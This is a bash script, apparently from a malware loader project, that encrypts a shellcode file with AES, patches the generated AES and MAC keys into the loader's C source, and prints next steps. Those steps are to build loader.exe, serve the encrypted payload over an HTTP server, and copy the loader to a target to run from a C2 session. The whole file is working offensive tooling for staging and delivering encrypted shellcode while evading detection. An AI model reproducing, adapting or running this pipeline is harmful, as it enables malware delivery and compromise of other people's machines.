#!/usr/bin/env bash
# forge.sh — one-shot payload forge:
#   1. build the Linux encoder (if not already built)
#   2. encrypt the given shellcode .bin into ./aes.encrypted
#   3. patch the fresh AES + MAC keys into src/aes-main.c
#
# After this: `make release` (or `make debug`) to rebuild the loader with the
# new keys, then serve ./aes.encrypted and drop ./build/loader.exe on target.
#
# Usage:  ./forge.sh <path/to/shellcode.bin>

set -euo pipefail

if [[ $# -ne 1 ]]; then
    echo "usage: $0 <path/to/shellcode.bin>" >&2
    exit 1
fi

SHELLCODE="$1"
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENCODER="$ROOT/build/encode2aes-linux"
AES_MAIN="$ROOT/src/aes-main.c"

[[ -f "$SHELLCODE" ]] || { echo "[-] shellcode not found: $SHELLCODE" >&2; exit 1; }
[[ -s "$SHELLCODE" ]] || { echo "[-] shellcode is empty: $SHELLCODE"   >&2; exit 1; }
[[ -f "$AES_MAIN"  ]] || { echo "[-] src/aes-main.c missing (wrong dir?)" >&2; exit 1; }

echo "[*] shellcode   : $SHELLCODE ($(stat -c %s "$SHELLCODE") bytes)"

# ---- 1. build the encoder if it's not already sitting there ----
if [[ ! -x "$ENCODER" ]]; then
    echo "[*] encoder absent, building via 'make encode2aes-linux' ..."
    ( cd "$ROOT" && make encode2aes-linux )
fi
echo "[+] encoder     : $ENCODER"

# ---- 2. encrypt — output lands at ./aes.encrypted (encoder writes to cwd) ----
cd "$ROOT"
ENC_OUTPUT="$("$ENCODER" "$SHELLCODE")"
echo "$ENC_OUTPUT" | sed 's/^/    | /'

AES_HEX="$(echo "$ENC_OUTPUT" | awk -F': *' '/^Key +\(hex\):/     {print $2}')"
MAC_HEX="$(echo "$ENC_OUTPUT" | awk -F': *' '/^MAC key +\(hex\):/ {print $2}')"

if [[ ${#AES_HEX} -ne 64 ]] || [[ ${#MAC_HEX} -ne 64 ]]; then
    echo "[-] could not parse 64-char AES/MAC hex from encoder output" >&2
    exit 1
fi
[[ -f "$ROOT/aes.encrypted" ]] || { echo "[-] encoder did not produce aes.encrypted" >&2; exit 1; }

echo "[+] AES_KEY     : $AES_HEX"
echo "[+] MAC_KEY     : $MAC_HEX"
echo "[+] aes.encrypted ($(stat -c %s "$ROOT/aes.encrypted") bytes) written to $ROOT/aes.encrypted"

# ---- 3. patch src/aes-main.c — replace aes_key[32] and mac_key[32] bodies ----
python3 - "$AES_MAIN" "$AES_HEX" "$MAC_HEX" <<'PY'
import re, sys

path, aes_hex, mac_hex = sys.argv[1], sys.argv[2], sys.argv[3]

def to_c_array(h):
    bs   = [f"0x{h[i:i+2]}" for i in range(0, 64, 2)]
    rows = [", ".join(bs[i:i+8]) for i in range(0, 32, 8)]
    return ",\n".join("        " + r for r in rows)

def swap(src, name, body):
    pat = re.compile(
        r'(static\s+const\s+uint8_t\s+' + re.escape(name) + r'\[32\]\s*=\s*\{)'
        r'[^}]*(\};)', re.DOTALL)
    def repl(m):
        return m.group(1) + "\n" + body + "\n    " + m.group(2)
    out, n = pat.subn(repl, src)
    if n != 1:
        sys.exit(f"[-] failed to patch {name!r} (matched {n} times) in {path}")
    return out

with open(path) as f:
    src = f.read()
src = swap(src, "aes_key", to_c_array(aes_hex))
src = swap(src, "mac_key", to_c_array(mac_hex))
with open(path, "w") as f:
    f.write(src)
PY

echo "[+] patched aes_key + mac_key arrays in src/aes-main.c"
echo ""
echo "next:"
echo "  make release                      # or 'make debug' for a lab run"
echo "  python3 -m http.server 8080       # serve aes.encrypted from this folder"
echo "  scp build/loader.exe <target>     # then run it from your C2 session"
